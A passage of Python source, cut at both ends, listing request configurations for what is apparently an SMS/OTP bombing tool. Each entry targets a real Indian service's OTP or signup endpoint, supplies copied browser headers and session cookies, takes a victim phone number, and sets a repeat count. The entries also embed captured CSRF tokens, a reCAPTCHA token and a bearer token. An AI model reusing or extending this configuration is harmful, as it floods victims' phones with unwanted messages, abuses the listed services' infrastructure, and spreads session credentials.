        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "varnishPrefixHome=false; utm_source=SPD-Search-Top8-National-Brand-EM-Home; utm_medium=gads_c_search; platform=web; _gcl_gs=2.1.k1$i1719310791; _gcl_au=1.1.1890033919.1719310798; _gcl_aw=GCL.1719310800.EAIaIQobChMI5dC558P2hgMVUhaDAx2-3AwcEAAYASAAEgJXUvD_BwE; _ga=GA1.1.1822449614.1719310800; _fbp=fb.1.1719310801079.320900520174536436; _ga_WQREN8TJ7R=GS1.1.1719310799.1.1.1719310837.22.0.0",
            "origin": "https://www.spinny.com",
            "platform": "web",
            "priority": "u=1, i",
            "referer": "https://www.spinny.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"contact_number": phone, "whatsapp": False, "code_len": 4, "g-recaptcha-response": "03AFcWeA4vFfvSahNObwINE1dnN-C8rahsbSbuh4fqeqcBJ82qWMuwus56lEKOYaUxj8u0opIAA7co7oDhBaTuIHM-Do3wgKmbo68rCKnvtFpPHiKiEpmKQhPcjvAT_6_y-2iyj_DR80S5npM-jXnNMoFS92SJQYvjGBbWFD9lFiFEgbnAWMBxUwNVyacx1gVszD7HvqC_nLDISnnqi7iWBjoYDJgTUg5iqds1DA-KYxbtEDtcpKgBi6Em34U4GG1ggZoKijC-k8qy1lInhWqo-xK6EY6acXydcGHKgXzWrsdHG2aciibuozN-3ZAWNfN0GsFfU4L1os4pe4ruCW1rEAuDJ3HT5ojiD5iiUUg4OBcJkUHCu2LSTBrTacO8PHH4PT5ruV-rvZyNVvAuX5xDcJea1NBUYyMitVtK0Lf1M75e3k3XL6K1MTq3QDDPXJlrStTSrB6qZ-m3n9Tf6sCnDZ0jcRoMtHU414MzHym3Itswbj5YuJM8wcn5aAnvvBv7UGskct4Jz4ZyJdcC5cS8AzYNSmyAS3JawN644RVl59KaNGsuYt9Ls7o2UtWhkIwlIsIBukVZW35yTaGNUhEWaRrDD-3BfUwKtloJItM2En2_nuI3f71HfTVI-I0dY6kTrMRuYfCGaz67jZiekSSIuOxenxVxp1BcG6rEO-zx-fRM_gMyDuiKGTmq98l-lPIfhSUFRXtloNr_qcKp1m6_jpzrfIi8M6UhiCYcnQCmNv19MAA8BWnEiyPPI_-FGh12jp22OCGA0mcoqGNadE6w-IezHN8fi6aWBAPRgEYf42XPv5oWiVa0ykvHg0MZKChb7n3Avk_ADibr632go3SVIIfXrFUgbWsUDLocd1WBkpeaUyKlKSqisbjKqHpxFMMaJGcjapUDstT1EMFINhNUCgowcKTY5zGMm9W9R9N48Ouxgyin2c7_0LmS5wPj3onP9yOJ8E6GL3aMKhtcxn4lXfxymyB1VFMzMMD-sAfkVoMliWhsludZWTOhuSXUE75SYxfDjrOQTlu6oRrda8QbMpR7Hv2qK2NjnrlNx4Qq2wSR0w56-Qtlif5gfFrD0U_TI7OH-yVcj45v_p0jGdoJ2Zh_6oFip5fSnSgdzXhSoGAKEVbm6NGrIGYiWLj6o-fnZrzpfRvqaS9NedG3qjr0p94lVFSeiW0s0BK0KpDWlwY4C7nbeqLkjk55tabY9B_nZjN7IXmJKNv46tZqMJVZJW37z7xV9aBQ17VARz8_UgluqS97i-NwsLuwWMZpCNpJeYGRVIKFSJtN1l3LutO1USLkYU9Or9fPEPPSOpG0fDbaFnK2QVruku8XnhvEYGHHEM0mFGcJK1-Eds95wA1c3P0Hr6DLfW7k3JKjQx_hJm719-w-UwsOYqZccz1Sh00-dmGlSJsrgOljgPOD8ZVca4Xso92P-W3NxnNEZLO45IjzTIkB1ItKYEDG7V1b4ixqw36J_lkPt7ekLvFMhcvNZkyIWTpI42Ag7ALnn6P3SfWAZwkrGXry6LPikOJz1zB5FdzEtUuF9_EO-YjzBRr1pv9ZmbSbdT2MOJv3rQ40GREvbIIfd_BA_zSyPl7HSe8QMlBksjHapVfBE_jNtcakDVSWdE6CBZjPksgIUIv6yzC0LWZA1h6v4mX-K85hmIb01UnPtnTMD_7o4K79JzYgk4gFLBxjTZVyKvBhFpVhCcq7ePBWiO8LPDbaF6R7uSF8ZgrRunZbrEMrnLBqx6EKrdtJGgN2q8VFCDjNeQJH3CuYuOISzE_rPfc", "expected_action": "login"}),
        "count": 3
    },
    
    {
        "url": "https://www.dream11.com/auth/passwordless/init",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "dh_user_id=17cf6211-32d3-11ef-b821-53f25fac4eef; _scid=48db139d-e4a8-4dbd-af4b-93becdc4c5d3; _scid_r=48db139d-e4a8-4dbd-af4b-93becdc4c5d3; _fbp=fb.1.1719310489582.789493345356902452; _sctr=1%7C1719298800000; __csrf=6rcny4; _dd_s=rum=2&id=e35a5e56-45d2-4dbf-8678-20bc45cbb11c&created=1719310504672&expire=1719311451078",
            "device": "pwa",
            "origin": "https://www.dream11.com",
            "priority": "u=1, i",
            "referer": "https://www.dream11.com/register?redirectTo=%2F",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-device-identifier": "macos"
        },
        "data": lambda phone: json.dumps({"channel": "sms", "flow": "SIGNUP", "phoneNumber": phone, "templateName": "default"}),
        "count": 1
    },
    
    {
        "url": "https://citymall.live/api/cl-user/auth/get-otp",
        "method": "POST",
        "headers": {
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Connection": "keep-alive",
            "Content-Type": "application/json",
            "Cookie": "bp=lg; vxid=3a5a7d25605926fc8a9f938b4198d7f3; referral=https%253A%252F%252Fwww.google.com%252F; _ga=GA1.1.100588395.1719309875; WZRK_G=4e632d8f31c540b3aaf6c01c140a7e0e; _fbp=fb.1.1719309877848.406176085245910420; WZRK_S_4RW-KZK-995Z=%7B%22p%22%3A1%2C%22s%22%3A1719309880%2C%22t%22%3A1719309879%7D; _ga_45DD1K708L=GS1.1.1719309875.1.0.1719309885.0.0.0",
            "Origin": "https://citymall.live",
            "Referer": "https://citymall.live/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "language": "en",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "use-applinks": "true",
            "x-app-name": "WEB",
            "x-requested-with": "WEB"
        },
        "data": lambda phone: json.dumps({"phone_number": phone}),
        "count": 5
    },
    
    {
        "url": "https://api.codfirm.in/api/customers/login/otp?medium=sms&phoneNumber={phone}&storeUrl=bellavita1.myshopify.com&email=undefined&resendingOtp=false",
        "method": "GET",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://bellavitaorganic.com",
            "priority": "u=1, i",
            "referer": "https://bellavitaorganic.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": None,
        "count": 10
    },
    
    {
        "url": "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "text/plain;charset=UTF-8",
            "cookie": "_csrf=0L9ShP2N7kBoNgROXcXgrpzO; acc=IN; X-Location=georegion%3D104%2Ccountry_code%3DIN%2Cregion_code%3DMH%2Ccity%3DMUMBAI%2Clat%3D18.98%2Clong%3D72.83%2Ctimezone%3DGMT%2B5.50%2Ccontinent%3DAS%2Cthroughput%3Dlow%2Cbw%3D1%2Casnum%3D55836%2Cnetwork_type%3Dmobile%2Clocation_id%3D0; mab=f14b44638c4c98b516a82db98baa1d6d; expd=mww2%3A1%7Cioab%3A0%7Cmhdp%3A1%7Cbcrp%3A0%7Cpwbs%3A1%7Cslin%3A1%7Chsdm%3A2%7Ccomp%3A0%7Cnrmp%3A1%7Cnhyw%3A1%7Cppsi%3A0%7Cgcer%3A0%7Crecs%3A1%7Clvhm%3A1%7Cgmbr%3A1%7Cyolo%3A1%7Crcta%3A1%7Ccbot%3A1%7Cotpv%3A1%7Cndbp%3A0%7Cmapu%3A1%7Cnclc%3A1%7Cdwsl%3A1%7Ceopt%3A1%7Cotpv%3A1%7Cwizi%3A1%7Cmorr%3A1%7Cyopb%3A1%7CTTP%3A1%7Caimw%3A1%7Chdpn%3A0%7Cweb2%3A0%7Clog2%3A0%7Clog2%3A0%7Cugce%3A0%7Cltvr%3A1%7Chwiz%3A0%7Cwizz%3A1%7Clpcp%3A1%7Cclhp%3A0%7Cprwt%3A0%7Ccbhd%3A0%7Cins2%3A3%7Cmhdc%3A1%7Clopo%3A1%7Cptax%3A1%7Ciiat%3A0%7Cpbnb%3A0%7Cror2%3A1%7Csovb%3A1%7Cqupi%3A0%7Cnbi1%3A3; appData=%7B%22userData%22%3A%7B%22isLoggedIn%22%3Afalse%7D%7D; token=dUxaRnA5NWJyWFlQYkpQNnEtemo6bzdvX01KLUNFbnRyS3hfdEgyLUE%3D; _uid=Not%20logged%20in; XSRF-TOKEN=OP9zTOUO-KF2BfPbXRH6JwwWcsE1QiHdq7eM; fingerprint2=8f2b46724e08bf3602b6c5f6745f8301; AMP_TOKEN=%24NOT_FOUND; _ga=GA1.2.185019609.1719309292; _gid=GA1.2.1636583452.1719309292; _gcl_au=1.1.1556474320.1719309295; tvc_utm_source=google; tvc_utm_medium=organic; tvc_utm_campaign=(not set); tvc_utm_key=(not set); tvc_utm_content=(not set); rsd=true; _gat=1; _ga_589V9TZFMV=GS1.1.1719309291.1.1.1719309411.8.0.1086743157",
            "deviceid": "8f2b46724e08bf3602b6c5f6745f8301411649",
            "externalheaders": "[object Object]",
            "loc": "153",
            "origin": "https://www.oyorooms.com",
            "priority": "u=1, i",
            "referer": "https://www.oyorooms.com/login?country=&retUrl=/search%3Flocation%3DGonda%252C%2520Uttar%2520Pradesh%252C%2520India%26latitude%3D27.0374187%26longitude%3D81.95348149999995%26searchType%3Dlocality%26coupon%3D%26checkin%3D25%252F06%252F2024%26checkout%3D26%252F06%252F2024%26roomConfig%255B%255D%3D1%26showSearchElements%3Dfalse%26country%3Dindia%26guests%3D1%26rooms%3D1",
            "sdata": "eyJrdWQiOlsxODc0MDAsNTA3MDAsOTA3MDAsODMzMDAsNTkxMDAsNjg4MDAsMTE4MDAwLDg2NDAwLDExOTgwMCwxMjg2MDAsMTE0NDAwLDE5NTAwMCw4MTUwMCwxMTE4MDAsMTU5MzAwLDE0MjYwMCwxNDA5MDAsNzI1NDQ3MDAsNzI3Njg4MDAsNzMwMDgxMDAsNzMxOTI1MDAsNzMzODQzMDAsNzM2MDAxMDAsNzM4MDg1MDAsNzM5Njg0MDAsNzQxNzY3MDAsNzQ0MzIzMDAsNzkwMjQ0MDAsMjAwMDAwLDExOTkwMCw0Nzk5MDAsODE1OTAwLDEwMjQwMDAsMTQzOTcwMCwyMTk5NzAwLDI1NzU3MDAsMTE0NDAwLDI1NjIzMDAsMzUyMjEwMCwxODM3MDAsMTc1NTAwLDE1OTEwMCwxOTg5MDAsMTUxNzAwLDE1MTkwMCwxNTkyMDAsMTE5NzAwLDExOTMwMF0sImFjYyI6W10sImd5ciI6W10sInR1ZCI6W10sInRpZCI6W10sImtpZCI6Wzk5MTMxMDAsNDEyODAwLDE4MDMwMCwxNzM4MDAsODA0MDAsMTA3OTAwLDcyNzUyMDAsNzE4MDAsMTc2MDAwLDIzMjMwMCwxNjMwMCw2MzMwMDAsMjc1MDYwMCwxODQ1MDAsMjI0NzAwLDI1MDEwMCwyMzMwMCw4MDAzMDAsMjMyMjAwLDMwMzc3MDAsMTYwMDUwMCw2NDcwMCw4MDAsMjMyNDAwLDMwNDgwMCw0ODMwMCw0ODcwMCwzMjQwMCw1NTI2MDBdLCJ0bXYiOltdfQ==",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "xsrf-token": "OP9zTOUO-KF2BfPbXRH6JwwWcsE1QiHdq7eM"
        },
        "data": lambda phone: json.dumps({"phone": phone, "country_code": "+91", "nod": 4}),
        "count": 2
    },
    
    {
        "url": "https://portal.myma.in/custom-api/auth/generateotp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://app.myma.in",
            "priority": "u=1, i",
            "referer": "https://app.myma.in/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"countrycode": "+91", "mobile": f"91{phone}", "is_otpgenerated": False, "app_version": "-1"}),
        "count": 6
    },
    
    {
        "url": "https://api.jobhai.com/auth/jobseeker/v3/send_otp",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json;charset=UTF-8",
            "device-id": "e97edd71-16a3-4835-8aab-c67cf5e21be1",
            "language": "en",
            "origin": "https://www.jobhai.com",
            "priority": "u=1, i",
            "referer": "https://www.jobhai.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "source": "WEB",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-transaction-id": "JS-WEB-cb71a96e-c335-4947-a379-bf6ee24f9a3d"
        },
        "data": lambda phone: json.dumps({"phone": phone}),
        "count": 6
    },
    
    {
        "url": "https://api.freedo.rentals/customer/sendOtpForSignUp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://freedo.rentals",
            "platform": "web",
            "priority": "u=1, i",
            "referer": "https://freedo.rentals/",
            "requestfrom": "customer",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-bn": "2.0.16",
            "x-channel": "WEB",
            "x-client-id": "FREEDO",
            "x-platform": "CUSTOMER"
        },
        "data": lambda phone: json.dumps({"email_id": "cokiwav528@avastu.com", "first_name": "Haiii", "mobile_number": phone}),
        "count": 6
    },
    
    {
        "url": "https://www.licious.in/api/login/signup",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cookie": "source=website; _gid=GA1.2.1957294880.1719308075; WZRK_G=fd462bffc0674ad3bdf9f6b7c537c6c7; _gat=1; _gcl_au=1.1.1898387226.1719308076; ajs_anonymous_id=f59e4a4c-db21-44c5-b067-2c942debda44; location=eyJjaXBoZXJ0ZXh0IjoidWp4RnBDeXpKZU1UVHV2THJnbjZSNHZlRWRXTXRmQWhaUlJYakZJVlFFRHV1a3FkQnBwT2hTOEVwc1h4Q1ltTUJKSXozUWMxRHZUYnIvTE1LNU52VG1IVytBTEc0ZDR5dktnZ1B6MjRBWUxQK0ZzRGxScmJMTXo3MU85bDJXdStISDhuQmdYRkZ5eEdteU44VVBqbDFlTzV5dEQvY1NSQTZ1MitORzhIajZKZXJma093QjJ1a2tVeEJrYWtIQWRmaHE3d0E4Sm41cWtCQmNYNUZxUUk0S1RYVjZudHBXYTBPcEViVHkxMmVuNEZjUXAyb2ZzU2M4eTkvWTlvWnV4UFNFZ0x6M0tTMXlmc0ZBN25MUWZ6RG0rbkt1SE5sMVpLMDFkU0VXaHVPMmQxUlFZemJ3NzF4QWsveWNUSDBwS2JoaitUaEZJY1M0NFZLWmsrK3A4K0VSU2pqNDJ2RG5RZU05NVUrYVEzOFI2UUR4RWRDV3hubVdoL3oyRWg0ZFJyIiwiaXYiOiI1YzlmNjlmMGNmOGY3ZjgwMWU3ZTEzZWRkNzQ5MDVmNiIsInNhbHQiOiJjZGMzYTZkNTI5Nzc3MWJmN2UzODE1NDI1ZmQ1YzYwZWM2MDU2N2U0ZmRhMzQ5ODg1OTQxYTM0MTFhODBjNDgyOTdhZTA1M2Q1ZjcxOWJkMWQ0OTk0OGEwYTU0ZjYzYjE0YmQ0NDc5NTAyZWZjZWFlOGQyMDM3MDQ3NzM3NmI4NTQxOWVhYmJlZDc1YWVlMTY2NjE1NzM3MzRhYTUxOWJmY2ExZGIxYzQ2MmU1NzBmNzQ1NDIwM2JhZWFjYmNmOGQ5MTQ3OThjNDEwNjllYWJhM2ViY2Q5Y2E4OTUwMDJmOTQ2YTIyYjllZjE4ZGJkZWZjZTg0YTU0OGU3MWFkMTEwZDc4MmZjNDVhYjYxYzg4ZWY1ZmRkODM3NGE1ZTkxODg2N2NjZDc3ODA0MmQzYjUzMmFjMzVkMTVmYjU0NzQ3NmY1Njg0NjJmNmE2Y2I2MTQ2NjZjODU1ZThjOWI0ZWMyZGVlOTlmMTdiZDkxZjMwMDI1NGMyMTNjOGUzNTY4YTEyNjFhZGY4ZTYxMGZmYmIxZmZiODgzMDQ5OGIxNGMyYzk5NDI4ODY1MmYzZjcxOTExOWFiZTRjODQyZTk4MjAxNDlmOWJiZDU4ZTgzMmYyYWI3OTQzZWY3YThjYjc1NDFjZjIxZGUxM2FkOTQ0ZGRkZjdjOTk1MTlmYTk4ZGE0MiIsIml0ZXJhdGlvbnMiOjk5OX0=; _ga_YN0TX18PEE=GS1.1.1719308076.1.1.1719308104.0.0.0; _ga=GA1.1.2028763947.1719308075; nxt=eyJjaXBoZXJ0ZXh0IjoiUXB4VkE1a2swL0FQQzB4SytuUzdiSVNaUDJkOS8rNDNEb2orQktNTVdhST0iLCJpdiI6Ijk1NTBiZDY1NzYwYjYxNGU1MDZkZTEzZjk5ODFlZThkIiwic2FsdCI6ImVjYzQ0MTNjZTllOGJhNTA3OTJjYzhmZTMyZjc0NTQ1MzI5NTNhNmY5Mjg1NWU4MmMzMzA0MWZiODc1ZmQzNTIyZjcyMjllZTViNTRmY2Y5YTVjYzJlYThkMDFlNGJhOTA0NDA5OGYxMjVhMDIxYTUzYzY3ZDA2N2I0MjJhNDAwM2U3NGUxOGVlYTIzZGE5YTUyNmQyOTgzYTU5NTQ0MjlhMTRiOTAzZDJjY2RlNTIyNmI3ZmI3MjdjZmVkMTJkZGQ4OTgzMWQ4MTJjYWMxMTRhMjI1MmEwMjFjOWYxYTM2NzFhOTVkZmUxNjNhNjI4ZjYxYzg3MWI4ZWQzZTUzN2NjOGM1YTNlNjQzNDdlYjY5MzQ0MWU2YWZjYTkyODlkMTcxOGQ2ODI5ZTJkN2Y1MjhhNzQzNjY4OGRmMjFmZGJiNWEwYWM5NTYyODMyNTQ4NzJhOThmOWEyODA2ZDhjZmVmNWNkOTA2MmE0NDc3YjY0ODk3ZGQ1Y2RlNjEyZWFhOTdmMGI1MDEwNDE2MjRkNzUyNDg5NDIyYmE0MmQwMzFjZGI2NWU1NjA5NTQ3ZjA2ZGQ0MDVmNjZjM2VmYjIzZWFjOTk1MTM4MTEzZGE5ZTFkNjFkYWFmZDJlMDJlOWZkMGEzNDVmMDNiNjFhNzU5OTlmYTM3NmZjZjIwMTIwOTUwIiwiaXRlcmF0aW9ucyI6OTk5fQ==; WZRK_S_445-488-5W5Z=%7B%22p%22%3A3%2C%22s%22%3A1719308078%2C%22t%22%3A1719308110%7D",
            "origin": "https://www.licious.in",
            "priority": "u=1, i",
            "referer": "https://www.licious.in/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-origin",
            "serverside": "false",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-csrf-token": ""
        },
        "data": lambda phone: json.dumps({"phone": phone, "captcha_token": None}),
        "count": 3
    },
    
    {
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "cosmofeed-request-id": "fe247a51-c977-4882-a9b8-fe303692ddc3",
            "origin": "https://superprofile.bio",
            "priority": "u=1, i",
            "referer": "https://superprofile.bio/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "cross-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
        },
        "data": lambda phone: json.dumps({"phoneNumber": phone, "countryCode": "+91", "data": {"email": "abcd2@gmail.com"}, "authScreen": "signup-screen", "userIsConvertingToCreator": False}),
        "count": 1
    },
    
    {
        "url": "https://apis.bisleri.com/send-otp",
        "method": "POST",
        "headers": {
            "accept": "*/*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "content-type": "application/json",
            "origin": "https://www.bisleri.com",
            "priority": "u=1, i",
            "referer": "https://www.bisleri.com/",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"',
            "sec-fetch-dest": "empty",
            "sec-fetch-mode": "cors",
            "sec-fetch-site": "same-site",
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "x-requested-with": "7Yhm6b86qTsrpcMWtUixPLnv02nHf3wFf5vkukwu"
        },
        "data": lambda phone: json.dumps({"email": "abfhhfhcd@gmail.com", "mobile": phone}),
        "count": 20
    },
    
    {
        "url": "https://www.evitalrx.in:4000/v3/login/signup_sendotp",
        "method": "POST",
        "headers": {
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "Accept": "application/json, text/plain, */*",
            "Content-Type": "application/json",
            "Referer": "https://pharmacy.evitalrx.in/",
            "sec-ch-ua-mobile": "?0",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: json.dumps({"pharmacy_name": "hfhfjfgfhkf", "mobile": phone, "referral_code": "", "email_id": "jhvd@gmail.com", "zip_code": "110086", "device_id": "f2cea99f-381d-432d-bd27-02bc6678fa93", "app_version": "desktop", "device_name": "Chrome", "device_model": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36", "device_manufacture": "Windows", "device_release": "windows-10", "device_sdk_version": "126.0.0.0"}),
        "count": 3
    },
    
    {
        "url": "https://pwa.getquickride.com/rideMgmt/probableuser/create/new",
        "method": "POST",
        "headers": {
            "APP-TOKEN": "s16-q9fz-jy3p-rk",
            "Accept": "application/json, text/plain, */*",
            "Accept-Language": "en-GB,en-US;q=0.9,en;q=0.8",
            "Authorization": "Bearer eyJhbGciOiJIUzUxMiJ9.eyJzdWIiOiIwIiwiaXNzIjoiUXVpY2tSaWRlIiwiaWF0IjoxNTI2ODg2NzU1fQ.nsy3UbPnaANf7d3O0xAW3LTG1P-dgcEhgqwOey-IK2kFCGxr298jfLKkE2k6taTvzETpJMPpertJu3uzJDtDUQ",
            "Connection": "keep-alive",
            "Content-Type": "application/x-www-form-urlencoded",
            "Cookie": "_ga_S6LZW9RD9Z=GS1.1.1719144863.1.0.1719144863.0.0.0; _ga=GA1.2.2033204632.1719144864; _gid=GA1.2.502724273.1719144864; _gat_gtag_UA_139055405_3=1; _gat_UA-139055405-3=1",
            "Origin": "https://pwa.getquickride.com",
            "Referer": "https://pwa.getquickride.com/",
            "Sec-Fetch-Dest": "empty",
            "Sec-Fetch-Mode": "cors",
            "Sec-Fetch-Site": "same-origin",
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36",
            "sec-ch-ua": '"Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": '"Windows"'
        },
        "data": lambda phone: f"contactNo={phone}&countryCode=%2B91&appName=Quick%20Ride&payload=&signature=&signatureAlgo=&domainName=pwa.getquickride.com",
        "count": 5
    },
    
    {
        "url": "https://www.clovia.com/api/v4/signup/check-existing-user/?phone={phone}&isSignUp=true&email=&is_otp=True&token",
        "method": "GET",
        "headers": {
            "accept": "application/json, text/plain, */*",
            "accept-language": "en-GB,en-US;q=0.9,en;q=0.8",
            "cookie": 'comp_par="utm_campaign=70553\054firstclicktime=2024-06-23 17:18:10.351125\054utm_medium=ppc\054http_referer=https://www.google.com/\054utm_source=10001"; cr_id_last=None; last_source_time="2024-06-23 17:18:10.351039"; last_source=10001; nur=None; sessionid=2kp1dzotrgpe698bfanq4tp4qechv2ln; data_in_visits="10001&2024-06-23 17:18:10.350961\054"; csrftoken=UrmVVY4g3YmpffRV3Rdznqrq2kBLItpN; utm_campaign_last=70553; __cf_bm=HdXzeqlgG6io1sY6qie2eVJ74XMfXuLRNJIs.oTzbho-1719143290-1.0.1.1-Op8tdLoYJnUoaXpFfk927ZZafyzjr3qZ5z2ejJCkf8HmQTPzaaGR.erei72oVEdSsJx_1XTH1zQNpmsn9zLAig; _cfuvid=T_lLlwC6IEneinYAELiGdaxZlBaqKOZ8upanwvhyZiE-1719143290370-0.0.1.1-604800000; fw_utm={%22value%22:%22{%5C%22utm_source%5C%22:%5C%2210001%5C%22%2C%5C%22utm_medium%5C%22:%5C%22ppc%5C%22%2C%5C%22utm_campaign%5C%22:%5C%2270553%5C%22}%22%2C%22createTime%22:%222024-06-23T11:48:13.312Z%22}; fw_uid={%22value%22:%2292f5a144-b31b-4b24-96c6-d894804e5039%22%2C%22createTime%22:%222024-06-23T11:48:13.337Z%22}; fw_se={%22value%22:%22fws2.c48f4a93-0256-4df1-ae3f-2d33f47d61d6.1.1719143293468%22%2C%22createTime%22:%222024-06-23T11:48:13.468Z%22}; G_ENABLED_IDPS=google; _gid=GA1.2.767062449.1719143297; _gac_UA-62869587-1=1.1719143297.EAIaIQobChMI683g3dPxhgMVWBmtBh1SkwpREAAYAiAAEgKP5PD_BwE; _gcl_au=1.1.385881254.1719143298; _gcl_gs=2.1.k1$i1719143288; _gac_UA-62869587-2=1.1719143298.EAIaIQobChMI683g3dPxhgMVWBmtBh1SkwpREAAYAiAAEgKP5PD_BwE; 